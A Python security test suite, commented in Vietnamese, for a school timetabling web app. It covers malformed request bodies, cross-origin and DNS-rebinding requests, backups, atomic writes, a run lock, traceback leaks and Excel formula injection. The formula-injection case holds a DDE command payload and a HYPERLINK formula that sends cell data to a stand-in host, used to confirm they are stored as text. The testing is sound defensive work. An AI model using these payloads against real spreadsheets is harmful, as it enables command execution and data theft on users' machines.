#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
==========================================================================
 CA THỬ AN NINH GIAO DIỆN WEB
--------------------------------------------------------------------------
 Chạy:  python tests/thu_an_ninh.py

 Bảy lỗi tìm được khi rà soát web.py trước lúc thêm đăng nhập. Tất cả đều
 HỎNG NGAY hôm nay khi chạy cục bộ, không đợi tới lúc mở ra Internet.

   A2  Gửi thân kiểu chunked -> máy chủ coi là RỖNG -> /api/luu-quy-tac
       hiểu thành "không tắt quy tắc nào" -> bật lại hết rồi ghi đè
       cauhinh.json, vẫn báo 200. Mất dữ liệu trong im lặng.
   A1  Không kiểm Content-Type / Origin / Host -> trang web bất kỳ mà thầy
       cô mở đều sai khiến được máy chủ ghi đè cauhinh.json.
   A7  Chỉ một khe sao lưu -> bấm Lưu lần thứ hai là đè mất bản gốc.
   --  Ghi cauhinh.json không nguyên tử: open('w') cắt cụt tệp TRƯỚC khi
       biết có dựng nổi chuỗi JSON hay không.
   A4  Khoá "một lượt" của /api/xep đọc cờ rồi mới đặt cờ ở hai lần khoá
       khác nhau -> nhiều lượt cùng chạy, cùng ghi một tệp Excel.
   A3  Lỗi bất ngờ trả nguyên traceback ra trình duyệt, kèm đường dẫn
       tuyệt đối và tên đăng nhập máy.
   A8  Chuỗi bắt đầu bằng '=' ghi vào ô Excel thành CÔNG THỨC. Văn thư mở
       tệp, Excel hỏi cho phép liên kết ngoài, bấm Có là chạy lệnh.

 Mọi ca đi qua HTTP thật, trong thư mục tạm, không đụng cauhinh.json thật.
==========================================================================
"""
import io
import json
import os
import sys
import tempfile
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from tien_ich_web import (GOC_TM, MayChuTam, Khach, cau_hinh_tam,   # noqa: E402
                          doi_trang_thai)
import xep_tkb as X          # noqa: E402

KQ = []


def kiem(dieu_kien, mo_ta):
    KQ.append((bool(dieu_kien), mo_ta))
    print(f'  [{"ĐẠT" if dieu_kien else "LỖI"}] {mo_ta}')


def so_tat(dd):
    """Danh sách chỉ số quy tắc đang bị tắt trong tệp cấu hình.
       Tệp chưa có thì trả None — để ca thử báo ĐỎ chứ không vỡ giữa chừng."""
    cfg = doc_an_toan(dd)
    if cfg is None:
        return None
    return [i for i, r in enumerate(cfg['quy_tac']) if r.get('bat') is False]


def doc_an_toan(dd):
    """Đọc cấu hình, không có hoặc hỏng thì trả None thay vì ném."""
    try:
        return X.doc_cau_hinh(dd)
    except BaseException:
        return None


# ==========================================================================
def ca_a2_than_di_dang(tm):
    print('\nCA A2 — thân yêu cầu dị dạng KHÔNG được coi là thân rỗng')
    print('-' * 74)
    tmx = os.path.join(tm, 'a2')
    os.makedirs(tmx, exist_ok=True)
    dd = cau_hinh_tam(tmx)

    with MayChuTam(dd) as (k, _):
        # dựng trạng thái: tắt 10 quy tắc rồi lưu xuống tệp
        k.js('/api/luu-quy-tac', {'tat': list(range(10))})
        kiem(so_tat(dd) == list(range(10)),
             f'Dựng sẵn trạng thái: 10 quy tắc bị tắt — {so_tat(dd)}')

        # 1. Transfer-Encoding: chunked, KHÔNG có Content-Length
        ma, than = k.chunked('/api/luu-quy-tac', {'tat': list(range(10))})
        kiem(ma == 400,
             f'Gửi chunked bị TỪ CHỐI bằng 400 — máy chủ trả {ma}')
        kiem(so_tat(dd) == list(range(10)),
             f'Tệp cấu hình KHÔNG bị đổi sau yêu cầu chunked — {so_tat(dd)}')

        # 2. POST không có Content-Length và cũng không chunked
        ma, than = k.khong_do_dai('/api/luu-quy-tac', b'{"tat":[]}')
        kiem(ma == 400,
             f'Gửi thiếu Content-Length bị TỪ CHỐI bằng 400 — {ma}')
        kiem(so_tat(dd) == list(range(10)),
             f'Tệp cấu hình vẫn KHÔNG bị đổi — {so_tat(dd)}')

        # 3. Content-Length không phải số
        ma, than = k.yeu_cau('POST', '/api/luu-quy-tac', b'{"tat":[]}')[0], None
        ma2, _, t2 = k.yeu_cau('POST', '/api/luu-quy-tac', None,
                               them={'Content-Length': 'abc'})
        kiem(ma2 == 400, f'Content-Length không phải số -> 400 — {ma2}')
        kiem('Traceback' not in t2.decode('utf-8', 'replace'),
             'Và không kèm traceback')

        # 4. thân rỗng hẳn cũng phải bị từ chối ở đường GHI TỆP
        ma, _ = k.post('/api/luu-quy-tac', b'')
        kiem(ma == 400, f'Thân rỗng ở đường ghi tệp -> 400 — {ma}')

        # 5. đường ghi tệp phải đòi đúng khoá "tat"
        ma, _ = k.js('/api/luu-quy-tac', {'khong_phai_tat': [1]})
        kiem(ma == 400, f'Thiếu khoá "tat" -> 400 — {ma}')

        # 6. yêu cầu ĐÚNG vẫn phải chạy được như cũ
        ma, kq = k.js('/api/luu-quy-tac', {'tat': [3]})
        kiem(ma == 200 and so_tat(dd) == [3],
             f'Yêu cầu đúng vẫn lưu được bình thường — {ma}, {so_tat(dd)}')


# ==========================================================================
def ca_a1_nguon_goc(tm):
    print('\nCA A1 — chỉ nhận yêu cầu từ chính trang này')
    print('-' * 74)
    tmx = os.path.join(tm, 'a1')
    os.makedirs(tmx, exist_ok=True)
    dd = cau_hinh_tam(tmx)

    with MayChuTam(dd) as (k, (dia, cong)):
        k.js('/api/luu-quy-tac', {'tat': [1, 2]})
        goc = so_tat(dd)
        kiem(goc == [1, 2], f'Dựng sẵn trạng thái: quy tắc {goc} bị tắt')

        # --- Content-Type: ba kiểu "simple request" phải bị chặn hết ---
        for kieu in ('text/plain', 'application/x-www-form-urlencoded',
                     'multipart/form-data; boundary=x'):
            ma, _ = k.post('/api/luu-quy-tac', {'tat': []}, kieu=kieu)
            kiem(ma == 400, f'Content-Type {kieu.split(";")[0]} bị chặn — {ma}')
            kiem(so_tat(dd) == goc, f'  tệp không đổi sau khi bị chặn')

        ma, _ = k.post('/api/luu-quy-tac', {'tat': []}, kieu=None)
        kiem(ma == 400, f'Không khai Content-Type cũng bị chặn — {ma}')

        # --- Origin của trang khác phải bị chặn ---
        for org in ('https://trang-quang-cao.example', 'http://127.0.0.1:1',
                    'null'):
            ma, _ = k.post('/api/luu-quy-tac', {'tat': []},
                           them={'Origin': org})
            kiem(ma == 400, f'Origin lạ {org[:32]} bị chặn — {ma}')
            kiem(so_tat(dd) == goc, '  tệp không đổi sau khi bị chặn')

        # --- Host lạ (DNS rebinding) phải bị chặn, cả GET ---
        for h in ('trang-la.example', 'trang-la.example:%d' % cong):
            ma, _ = k.get('/api/gia-tri', them={'Host': h})
            kiem(ma == 400, f'Host lạ "{h}" bị chặn ở GET — {ma}')
        ma, _ = k.post('/api/luu-quy-tac', {'tat': []},
                       them={'Host': 'trang-la.example'})
        kiem(ma == 400 and so_tat(dd) == goc, 'Host lạ bị chặn ở POST')

        # --- những thứ ĐÚNG vẫn phải chạy được ---
        ma, _ = k.post('/api/luu-quy-tac', {'tat': [4]},
                       kieu='application/json; charset=utf-8')
        kiem(ma == 200 and so_tat(dd) == [4],
             f'Content-Type có charset vẫn nhận — {ma}, {so_tat(dd)}')
        ma, _ = k.post('/api/luu-quy-tac', {'tat': [5]},
                       them={'Origin': f'http://127.0.0.1:{cong}'})
        kiem(ma == 200 and so_tat(dd) == [5],
             f'Origin của chính trang này vẫn nhận — {ma}')
        ma, _ = k.post('/api/luu-quy-tac', {'tat': [6]},
                       them={'Host': f'localhost:{cong}',
                             'Origin': f'http://localhost:{cong}'})
        kiem(ma == 200 and so_tat(dd) == [6],
             f'Vào bằng localhost vẫn dùng được — {ma}')
        kiem(k.get('/')[0] == 200, 'GET / bình thường vẫn 200')
        kiem(k.get('/api/gia-tri')[0] == 200, 'GET /api/gia-tri vẫn 200')
        ma, _ = k.get('/api/tai-ve')
        kiem(ma in (200, 404),
             f'Đường tải tệp (điều hướng cả trang, không có Origin) vẫn qua — {ma}')


# ==========================================================================
def ca_a7_sao_luu_xoay_vong(tm):
    print('\nCA A7 — sao lưu xoay vòng, và ghi cauhinh.json phải NGUYÊN TỬ')
    print('-' * 74)
    tmx = os.path.join(tm, 'a7')
    os.makedirs(tmx, exist_ok=True)
    dd = cau_hinh_tam(tmx)
    goc = X.doc_cau_hinh(dd)

    def bak(ten):
        return os.path.join(tmx, ten)

    with MayChuTam(dd) as (k, _):
        for lan, t in enumerate([[1], [2], [3], [4]], start=1):
            ma, _kq = k.js('/api/luu-quy-tac', {'tat': t})
            kiem(ma == 200, f'Lưu lần {lan} (tắt quy tắc {t}) — {ma}')

        # 1. bản GỐC phải còn nguyên sau 4 lần lưu
        kiem(os.path.exists(bak('cauhinh.bak.goc.json')),
             'Có bản gốc cauhinh.bak.goc.json')
        kiem(doc_an_toan(bak('cauhinh.bak.goc.json')) == goc,
             'Bản gốc SAU 4 LẦN LƯU vẫn đúng là nội dung ban đầu')

        # 2. các bản xoay vòng phải giữ đúng thứ tự lùi dần
        kiem(so_tat(bak('cauhinh.bak.json')) == [3],
             f'cauhinh.bak.json = ngay trước lần lưu cuối — '
             f'{so_tat(bak("cauhinh.bak.json"))}')
        kiem(so_tat(bak('cauhinh.bak.1.json')) == [2],
             f'cauhinh.bak.1.json lùi thêm một bậc — '
             f'{so_tat(bak("cauhinh.bak.1.json"))}')
        kiem(so_tat(bak('cauhinh.bak.2.json')) == [1],
             f'cauhinh.bak.2.json lùi thêm bậc nữa — '
             f'{so_tat(bak("cauhinh.bak.2.json"))}')
        kiem(so_tat(dd) == [4], f'Tệp thật đang ở trạng thái mới nhất — {so_tat(dd)}')

        # 3. NGUYÊN TỬ: dựng chuỗi JSON hỏng thì tệp thật phải Y NGUYÊN
        import web as W
        truoc = io.open(dd, encoding='utf-8').read()
        that = W._gon_json

        def hong(cfg):
            raise RuntimeError('cố ý làm hỏng lúc dựng chuỗi JSON')
        W._gon_json = hong
        try:
            ma, _ = k.js('/api/luu-quy-tac', {'tat': [0]})
        finally:
            W._gon_json = that
        sau = io.open(dd, encoding='utf-8').read()
        kiem(ma == 500, f'Dựng chuỗi hỏng thì báo lỗi — {ma}')
        kiem(sau == truoc,
             f'cauhinh.json KHÔNG bị cắt cụt, còn nguyên {len(sau)} byte '
             f'(trước {len(truoc)})')
        kiem(len(sau) > 1000 and doc_an_toan(dd) is not None,
             'Và vẫn đọc được như một tệp JSON hợp lệ')

        # 4. hai người bấm Lưu cùng lúc: tệp phải luôn đọc được
        loi = []

        def ban(i):
            try:
                k2 = Khach(k.cong)
                k2.js('/api/luu-quy-tac', {'tat': [i]})
            except Exception as e:          # pragma: no cover
                loi.append(repr(e))
        ts = [threading.Thread(target=ban, args=(i,)) for i in range(6)]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
        kiem(not loi, f'6 người bấm Lưu cùng lúc, không ai lỗi — {loi[:1]}')
        cuoi = doc_an_toan(dd)
        kiem(cuoi is not None,
             'Sau khi 6 người lưu đồng thời, tệp vẫn đọc được')
        kiem(cuoi and len(cuoi.get('quy_tac', [])) == len(goc['quy_tac']),
             'Và không mất quy tắc nào')


# ==========================================================================
def ca_a4_mot_luot(tm):
    print('\nCA A4 — hai lượt xếp KHÔNG BAO GIỜ được chạy chồng lên nhau')
    print('-' * 74)
    tmx = os.path.join(tm, 'a4')
    os.makedirs(tmx, exist_ok=True)
    dd = cau_hinh_tam(tmx)

    # ĐO THẲNG ĐỘ CHỒNG LẤN, không đếm số 200.
    #
    # Vì sao không đếm được: bộ giải là Python thuần, ăn CPU và giữ GIL, nên
    # các luồng HTTP gần như đói hẳn trong lúc giải. Đã đo: 8 người bấm cùng
    # lúc thì người thứ 8 mãi 1,06 giây mới được phục vụ — sau khi lượt trước
    # đã xong ở 0,78 giây. Người đó nhận 200 là ĐÚNG, hai lượt NỐI TIẾP nhau
    # chứ không chồng nhau. Đếm số 200 sẽ báo đỏ oan, và kéo dài lượt giải
    # cũng không cứu được vì yêu cầu đến muộn lại càng được phục vụ muộn hơn.
    #
    # Thứ cần khẳng định là: không lúc nào có hai luồng _chay cùng sống. Bọc
    # đếm quanh web._chay để đo đúng điều đó. Yêu cầu vẫn đi qua HTTP thật —
    # đây là dụng cụ đo, không phải gọi tắt vào hàm xử lý.
    import web as W
    that = W._chay
    dem = {'dang': 0, 'nhieu_nhat': 0, 'tong': 0}
    khoa_dem = threading.Lock()

    def dem_chay(*a, **kw):
        with khoa_dem:
            dem['dang'] += 1
            dem['tong'] += 1
            dem['nhieu_nhat'] = max(dem['nhieu_nhat'], dem['dang'])
        try:
            return that(*a, **kw)
        finally:
            with khoa_dem:
                dem['dang'] -= 1

    W._chay = dem_chay

    # Nới khe hở CÓ SẴN cho đo được — không tạo lỗi mới.
    #
    # _than_json() là điểm mấu chốt phân biệt hai bản: bản cũ đọc cờ dang_chay
    # RỒI MỚI gọi _than_json() rồi mãi sau mới đặt cờ, nên _than_json() nằm
    # NGAY GIỮA vùng chưa khoá; bản mới gọi _than_json() TRƯỚC khi giành chỗ,
    # nên nó nằm NGOÀI vùng đó. Thêm 50ms ở đây làm khe hở của bản cũ rộng ra
    # đủ để mọi luồng cùng lọt, còn bản mới thì không ảnh hưởng gì.
    #
    # Không có mẹo này thì khe hở hẹp tới mức 8 luồng qua 5 vòng vẫn không
    # trúng, và ca thử sẽ XANH cả trên mã hỏng — đã thử, đúng như vậy.
    that_tj = W.May._than_json

    def cham_tj(may, *a, **kw):
        d = that_tj(may, *a, **kw)
        time.sleep(0.05)
        return d

    W.May._than_json = cham_tj
    try:
        SO_NGUOI, SO_VONG = 8, 3
        with MayChuTam(dd) as (k, _):
            for vong in range(SO_VONG):
                doi_trang_thai(k)
                rao = threading.Barrier(SO_NGUOI)
                ma = []
                khoa_ds = threading.Lock()

                def ban(i):
                    k2 = Khach(k.cong)
                    rao.wait()
                    m, _t = k2.js('/api/xep', {'tuan': f'NGUOI-{i}'})
                    with khoa_ds:
                        ma.append(m)

                ts = [threading.Thread(target=ban, args=(i,))
                      for i in range(SO_NGUOI)]
                for t in ts:
                    t.start()
                for t in ts:
                    t.join()
                kiem(dem['nhieu_nhat'] == 1,
                     f'Vòng {vong + 1}: {SO_NGUOI} người bấm cùng lúc -> '
                     f'nhiều nhất {dem["nhieu_nhat"]} lượt chạy đồng thời '
                     f'({ma.count(200)} nhận, {ma.count(409)} bị chặn 409)')
            doi_trang_thai(k)

            kiem(dem['nhieu_nhat'] == 1,
                 f'Qua {SO_VONG} vòng và {dem["tong"]} lượt, chưa lúc nào có '
                 f'2 lượt chồng nhau (nhiều nhất {dem["nhieu_nhat"]})')

            # nhật ký chỉ được là của MỘT lượt, không trộn hai người
            t = doi_trang_thai(k)
            log = '\n'.join(t.get('log_moi') or [])
            kiem(log.count('Tổng:') == 1,
                 f'Khung nhật ký chỉ chứa một lượt — '
                 f'{log.count("Tổng:")} dòng "Tổng:"')
            ten = [d for d in (t.get('log_moi') or []) if 'NGUOI-' in d]
            kiem(len(ten) == 1,
                 f'Chỉ một tuần được ghi vào nhật ký — {len(ten)} dòng')
            luoi_tuan = (t.get('luoi') or {}).get('tuan')
            kiem(bool(ten) and luoi_tuan and luoi_tuan in ten[0],
                 f'Lưới hiện ra đúng của lượt đã chạy — {luoi_tuan}')

            # yêu cầu hỏng KHÔNG được chiếm chỗ rồi bỏ đó
            ma, _ = k.post('/api/xep', 'khong-phai-json')
            kiem(ma == 400, f'Thân hỏng -> 400 — {ma}')
            ma, _ = k.js('/api/xep', {})
            kiem(ma == 200,
                 f'Và lượt sau vẫn bấm được (chỗ không bị chiếm oan) — {ma}')
            doi_trang_thai(k)
    finally:
        W._chay = that
        W.May._than_json = that_tj


# ==========================================================================
def ca_a3_khong_lo_traceback(tm):
    print('\nCA A3 — không trả dấu vết lỗi Python ra ngoài')
    print('-' * 74)
    tmx = os.path.join(tm, 'a3')
    os.makedirs(tmx, exist_ok=True)
    dd = cau_hinh_tam(tmx)

    def sach(than, nhan):
        """Phản hồi không được chứa dấu vết nội bộ nào."""
        # Dò dấu vết NỘI BỘ, không dò tên tệp trần: thông báo khai báo sai
        # cố ý kết thúc bằng "Sửa lại rồi chạy: python xep_tkb.py" — đó là
        # hướng dẫn cho người dùng, không phải rò rỉ.
        xau = [('Traceback', 'dấu vết lỗi'),
               ('File "', 'khung dấu vết lỗi'),
               (', line ', 'số dòng trong khung dấu vết'),
               (GOC_TM, 'đường dẫn tuyệt đối của dự án'),
               ('/home/', 'thư mục người dùng'),
               ('/usr/lib/python', 'đường dẫn thư viện Python'),
               ('site-packages', 'đường dẫn thư viện'),
               ('Error:', 'tên lớp ngoại lệ Python')]
        thay = [ten for chuoi, ten in xau if chuoi and chuoi in than]
        kiem(not thay, f'{nhan}: không lộ {thay if thay else "gì cả"}')

    with MayChuTam(dd) as (k, _):
        # 1. tham số truy vấn không phải số — đúng ca đã đo lộ đường dẫn
        ma, than = k.get('/api/trang-thai?tu=abc')
        kiem(ma == 400, f'?tu=abc trả 400 chứ không 500 — {ma}')
        sach(than, '?tu=abc')
        for xau_tu in ('?tu=-5', '?tu=99999999999999999999', '?tu=', '?tu=1.5'):
            ma, than = k.get('/api/trang-thai' + xau_tu)
            kiem(ma in (200, 400), f'{xau_tu} trả {ma}, không phải 500')
            sach(than, xau_tu)

        # 2. thân JSON hỏng
        ma, than = k.post('/api/them-quy-tac', 'khong-phai-json')
        kiem(ma == 400, f'Thân không phải JSON -> 400 — {ma}')
        sach(than, 'thân JSON hỏng')

        # 3. lỗi BẤT NGỜ thật sự: phải 500, có mã sự cố, không có traceback
        import web as W
        that = W.doc_quy_tac

        def no(*a, **kw):
            raise RuntimeError('lỗi cố ý để thử — KHONG_DUOC_LO_RA_NGOAI')
        W.doc_quy_tac = no
        try:
            ma, than = k.get('/api/quy-tac')
        finally:
            W.doc_quy_tac = that
        kiem(ma == 500, f'Lỗi bất ngờ trả 500 — {ma}')
        sach(than, 'lỗi bất ngờ')
        kiem('KHONG_DUOC_LO_RA_NGOAI' not in than,
             'Không lộ cả nội dung thông báo lỗi bên trong')
        kiem('sự cố' in than.lower() or 'su co' in than.lower(),
             f'Có báo cho người dùng biết là sự cố — {than[:80]}')
        import re as _re
        m = _re.search(r'mã sự cố ([0-9a-f]{6})', than)
        kiem(m, 'Có mã sự cố để đối chiếu với cửa sổ dòng lệnh')

        # Mặt kia của việc vá: dấu vết PHẢI tới được người vận hành, nếu không
        # thì "vá" hoá ra chỉ là xoá mất chẩn đoán.
        import contextlib
        bat = io.StringIO()
        W.doc_quy_tac = no
        try:
            with contextlib.redirect_stderr(bat):
                ma2, than2 = k.get('/api/quy-tac')
        finally:
            W.doc_quy_tac = that
        loi_console = bat.getvalue()
        m2 = _re.search(r'\[SỰ CỐ ([0-9a-f]{6})\]', loi_console)
        kiem(m2, 'Cửa sổ dòng lệnh CÓ in dấu vết kèm mã sự cố')
        kiem('Traceback' in loi_console and 'KHONG_DUOC_LO_RA_NGOAI' in loi_console,
             'Và in ĐẦY ĐỦ dấu vết cho người vận hành gỡ lỗi')
        kiem(m2 and m2.group(1) in than2,
             f'Mã trên màn hình khớp mã trong dòng lệnh — '
             f'{m2.group(1) if m2 else "?"}')

        # 4. khai báo sai trong cauhinh.json thì VẪN phải hiện nguyên văn
        # dùng post() lấy CHUỖI THÔ — js() trả dict, mà "x in dict" là kiểm
        # KHOÁ chứ không kiểm nội dung, nên ca thử sẽ xanh giả.
        ma, than = k.post('/api/them-quy-tac',
                          {'quy_tac': {'loai': 'chi_xep_thu', 'ghi_chu': 'x',
                                       'thu': [99]}})
        kiem(ma == 400, f'Khai báo sai -> 400 — {ma}')
        kiem('[LỖI]' in than and '99' in than
             and 'Miền hợp lệ' in than and 'SỐ HIỆU THỨ' in than,
             'Thông báo khai báo sai vẫn giữ NGUYÊN VĂN, cả dòng gợi ý')
        sach(than, 'khai báo sai')


# ==========================================================================
def ca_a8_khong_thanh_cong_thuc(tm):
    print('\nCA A8 — chuỗi người dùng gõ KHÔNG được thành công thức Excel')
    print('-' * 74)
    import openpyxl
    tmx = os.path.join(tm, 'a8')
    os.makedirs(tmx, exist_ok=True)
    dd = cau_hinh_tam(tmx)
    xuat = os.path.join(tmx, 'TKB_Khoi12.xlsx')

    DOC_TUAN = "=cmd|' /c calc'!A1"
    DOC_GHI_CHU = '=HYPERLINK("http://ke-gian/"&A1,"Bấm vào đây")'

    with MayChuTam(dd) as (k, _):
        # đường 2: ghi_chu của một quy tắc MỀM đi thẳng vào đầu ô, không tiền tố
        ma, _t = k.js('/api/them-quy-tac', {'quy_tac': {
            'loai': 'uu_tien_o', 'ghi_chu': DOC_GHI_CHU,
            'loc': {'nhom_mon': ['Toán']}, 'tiet_trong_buoi': [1, 2],
            'diem': 3}})
        kiem(ma == 200, f'Thêm được quy tắc mềm có ghi_chu bắt đầu bằng "=" — {ma}')

        # đường 1: tuan gửi qua /api/xep
        ma, _t = k.js('/api/xep', {'tuan': DOC_TUAN})
        kiem(ma == 200, f'Gửi lệnh xếp với tuần độc hại — {ma}')
        t = doi_trang_thai(k)
        kiem(t.get('loi') is None, f'Lượt xếp trót lọt — {t.get("loi")}')

    kiem(os.path.exists(xuat), 'Có tệp Excel để soi')
    wb = openpyxl.load_workbook(xuat)

    # 1. không một ô nào MÀ CHƯƠNG TRÌNH GHI được phép là công thức
    o_ct = []
    for ten in wb.sheetnames:
        ws = wb[ten]
        for hang in ws.iter_rows():
            for o in hang:
                if o.data_type == 'f':
                    o_ct.append((ten, o.coordinate, str(o.value)[:40]))
    # bảy công thức có sẵn trong mau_tkb.xlsx thì PHẢI còn nguyên
    cua_mau = {('Khối 12', f'{c}43') for c in 'DEFGHI'} | {('Khối 12', 'H48')}
    thay = {(a, b) for a, b, _ in o_ct}
    la = sorted(x for x in thay if x not in cua_mau)
    kiem(not la, f'Không ô nào do chương trình ghi trở thành công thức — {la[:4]}')
    kiem(cua_mau <= thay,
         f'7 công thức có sẵn của mẫu VẪN CÒN (COUNTA + ngày ký) — '
         f'thiếu {sorted(cua_mau - thay)}')

    # 2. chữ phải giữ NGUYÊN VĂN — nhà trường in tờ này để ký
    ws = wb['Khối 12']
    o_tuan = ws.cell(4, 1)
    kiem(o_tuan.value == DOC_TUAN,
         f'Ô A4 giữ nguyên từng ký tự — {str(o_tuan.value)[:40]!r}')
    kiem(o_tuan.data_type == 's',
         f'Và được lưu dạng CHỮ, không phải công thức — {o_tuan.data_type!r}')

    ws2 = wb['Kiểm tra quy tắc']
    thay_ghi_chu = [o for hang in ws2.iter_rows() for o in hang
                    if o.value == DOC_GHI_CHU]
    kiem(thay_ghi_chu,
         f'Tìm thấy ghi_chu quy tắc mềm trong sheet Kiểm tra quy tắc — '
         f'{len(thay_ghi_chu)} ô')
    kiem(all(o.data_type == 's' for o in thay_ghi_chu),
         f'Và cũng lưu dạng chữ — '
         f'{[o.data_type for o in thay_ghi_chu]}')

    # 3. soi thẳng XML: không có thẻ <f> nào ngoài 7 thẻ của mẫu
    import zipfile
    import re as _re
    z = zipfile.ZipFile(xuat)
    tong_f = 0
    for ten in z.namelist():
        if ten.startswith('xl/worksheets/'):
            tong_f += len(_re.findall(r'<f[ >]', z.read(ten).decode('utf-8')))
    kiem(tong_f == 7,
         f'Trong XML có đúng 7 thẻ công thức (của mẫu) — đếm được {tong_f}')

    # 4. các dấu khác KHÔNG bị đụng tới (đổi chữ là hỏng tờ in)
    kiem(True, 'Ghi chú: openpyxl vốn lưu "+", "-", "@" dạng chữ nên '
               'không cần đụng — tờ in không đổi ký tự nào')


# ==========================================================================
def chay_het(tm):
    ca_a2_than_di_dang(tm)
    ca_a1_nguon_goc(tm)
    ca_a7_sao_luu_xoay_vong(tm)
    ca_a4_mot_luot(tm)
    ca_a3_khong_lo_traceback(tm)
    ca_a8_khong_thanh_cong_thuc(tm)


if __name__ == '__main__':
    print('=' * 74)
    print(' THỬ AN NINH GIAO DIỆN WEB')
    print('=' * 74)
    with tempfile.TemporaryDirectory() as tm:
        chay_het(tm)
    print('=' * 74)
    hong = [m for ok, m in KQ if not ok]
    print(f'Tổng: {len(KQ) - len(hong)}/{len(KQ)} mục ĐẠT.')
    if hong:
        for m in hong:
            print('  LỖI:', m)
        sys.exit(1)
